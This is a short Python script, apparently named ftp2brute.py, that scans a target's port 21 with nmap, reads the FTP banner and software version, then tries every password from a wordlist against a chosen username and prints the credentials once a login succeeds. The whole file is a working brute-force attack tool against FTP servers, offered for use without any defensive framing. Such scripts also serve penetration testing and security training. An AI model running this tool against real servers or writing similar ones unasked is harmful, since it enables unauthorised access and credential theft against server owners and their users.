#!/usr/bin/python3

import socket
import ftplib
import sys
import nmap

def usage():
    print ("Usage: " + sys.argv[0] + " <target> <user> <wordlist>")
    print ("Example: %s 192.168.1.1 admin wordlist.txt" %sys.argv[0])

def openTheFtp(data, ftp):
    print (data.strip())
    ftp.login(str(sys.argv[2]), data.strip())
    ftp.quit()
    print ("[!] Creds found: \nUser: {} \nPass: {}".format(str(sys.argv[2]), data.strip()))
    sys.exit(0)

def main():
    nm = nmap.PortScanner()
    ip = socket.gethostbyname(str(sys.argv[1]))
    port = '21'
    arguments = '-sT -sV'
    service = nm.scan(ip, port, arguments)
    with open (str(sys.argv[3])) as file:
        words = file.readlines()
        try:
            ftp = ftplib.FTP(str(ip))
            print ("[+] Software Version: " + service['scan'][ip]['tcp'][21]['product'])
            print ("[+] Banner: " + ftp.getwelcome())
            print ("[+] User: {}".format(str(sys.argv[2])))
            print ("[+] Bruteforcing")
            for word in words:
                try:
                    openTheFtp(word, ftp)
                except ftplib.error_perm:
                    pass
                except:
                    raise
        except:
            raise

if __name__ == "__main__":
    # Usagee: python ftp2brute.py <host> <user> <wordlist>
    if len(sys.argv) == 4:
         main()
    else:
        usage()
        sys.exit()
